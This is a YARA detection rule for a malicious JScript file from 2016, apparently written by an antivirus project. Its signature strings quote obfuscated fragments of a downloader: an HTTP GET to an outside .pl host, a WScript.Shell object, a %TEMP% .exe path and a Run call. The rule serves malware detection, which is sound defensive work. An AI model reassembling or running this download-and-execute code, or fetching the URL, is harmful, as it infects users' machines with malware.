rule sig_20160401_c8192faf2ab7e05801c2b594f280fe0b {
  meta:
    description = "datamaliciousorder - file 20160401_c8192faf2ab7e05801c2b594f280fe0b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5ce8c91264a083c05d0d31c66d5cd583d22b6ef54ffbe2a8d6a1ae13a2a94c3e"

  strings:
    $s1  = "AgaBh[XrkWw](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function MuXe(NxBoz, NtMeg){VtkLgh = VtkLgh * 1; return NxBoz - NtMeg;};" fullword ascii
    $s3  = "var DwrQa = function WvhErq() {return WScript[MylRfe](\"WScript\"+\".Shell\");}(), OdzRct = 11;" fullword ascii
    $s4  = "if (AgaBh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QufQce() {return DwrQa[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"j7Klx7PayiT2bR.ex\" + \"e\";};" fullword ascii
    $s6  = "function TmhSj(){return TooDsp + \"\";};" fullword ascii
    $s7  = "function QzfPz() {return ((ZawWgb == true) && (ZawWgb == YmmZe)) ? 1 : VtkLgh;};" fullword ascii
    $s8  = "var JvFds = false;" fullword ascii
    $s9  = "YmmZe = true; " fullword ascii
    $s10 = "var ZawWgb = false;" fullword ascii
    $s11 = "function LewXpf(EbtEq){DwrQa[\"R\"+\"un\"](EbtEq, VtkLgh, VtkLgh);};" fullword ascii
    $s12 = "ZawWgb = true; " fullword ascii
    $s13 = "return MuXe(BvJqg, ZimCuv);" fullword ascii
    $s14 = "}while (IeiPrk);" fullword ascii
    $s15 = "function YdAmq(SsVh) {var ArBk = (1, 2, 3, 4, 5, SsVh); return ArBk;};" fullword ascii
    $s16 = "function VhxCrh(){return MylRfe;};" fullword ascii
    $s17 = "function SkeFy(){return 23;};" fullword ascii
    $s18 = "var DiwUv = new this[\"Date\"]();" fullword ascii
    $s19 = "var YmmZe = false;" fullword ascii
    $s20 = "function JzmIjk()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}